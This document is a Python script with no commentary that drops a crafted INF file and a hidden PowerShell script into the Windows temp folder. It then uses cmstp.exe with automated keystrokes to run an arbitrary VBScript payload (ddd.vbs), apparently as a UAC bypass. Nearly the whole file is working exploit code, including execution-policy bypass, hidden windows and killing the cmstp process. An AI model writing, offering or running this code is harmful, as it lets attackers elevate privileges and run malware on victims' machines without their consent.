import os
import subprocess

# INF file content
inf_content = '''
[version]
Signature="$Windows NT$"
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
; Commands to run before setup begins
taskkill /IM cmstp.exe /F
cmd /c start %temp%\ddd.vbs

[CustInstDestSectionAllUsers]
49000,49001=AllUser_LDIDSection,7

[AllUser_LDIDSection]
"HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
'''

# PowerShell script content
a_ps1_content = r'''
$InfFile = "$env:TEMP\corpvpn.inf"

Function Get-Hwnd {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [string] $ProcessName
    )
    Process {
        $ErrorActionPreference = 'Stop'
        Try {
            $hwnd = Get-Process -Name $ProcessName | Select-Object -ExpandProperty MainWindowHandle
        } Catch {
            $hwnd = $null
        }
        $hash = @{
            ProcessName = $ProcessName
            Hwnd        = $hwnd
        }
        New-Object -TypeName PsObject -Property $hash
    }
}

function Set-WindowActive {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [string] $Name
    )
    Process {
        $memberDefinition = @'
        [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
'@
        Add-Type -MemberDefinition $memberDefinition -Name Api -Namespace User32
        $hwnd = Get-Hwnd -ProcessName $Name | Select-Object -ExpandProperty Hwnd
        If ($hwnd) {
            $onTop = New-Object -TypeName System.IntPtr -ArgumentList (0)
            [User32.Api]::SetForegroundWindow($hwnd)
            [User32.Api]::ShowWindow($hwnd, 0)
        } Else {
            [string] $hwnd = 'N/A'
        }
        $hash = @{
            Process = $Name
            Hwnd    = $hwnd
        }
        New-Object -TypeName PsObject -Property $hash
    }
}

Add-Type -AssemblyName System.Windows.Forms

$ps = New-Object System.Diagnostics.ProcessStartInfo "c:\\windows\\system32\\cmstp.exe"
$ps.Arguments = "/au $InfFile"
$ps.UseShellExecute = $false
$ps.CreateNoWindow = $true

[System.Diagnostics.Process]::Start($ps) | Out-Null

do {
    Start-Sleep -Milliseconds 500
} until ((Set-WindowActive cmstp).Hwnd -ne 0)

Set-WindowActive cmstp

[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
'''

# Write files to TEMP
temp_dir = os.getenv("TEMP")
inf_path = os.path.join(temp_dir, "corpvpn.inf")
ps1_path = os.path.join(temp_dir, "a.ps1")

with open(inf_path, 'w', encoding='utf-8') as f:
    f.write(inf_content)

with open(ps1_path, 'w', encoding='utf-16') as f:
    f.write(a_ps1_content)

# Execute PowerShell script
subprocess.run([
    "powershell",
    "-ExecutionPolicy", "Bypass",
    "-WindowStyle", "Hidden",
    "-File", ps1_path
])
